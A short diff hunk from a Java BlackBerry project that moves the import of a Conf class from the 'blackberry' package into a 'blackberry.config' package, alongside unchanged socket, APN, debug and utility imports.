@@ -19,8 +19,8 @@ import javax.microedition.io.SocketConnection;
 import javax.microedition.io.StreamConnection;
 
 import net.rim.device.api.io.SocketConnectionEnhanced;
-import blackberry.Conf;
 import blackberry.action.Apn;
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.utils.Check;
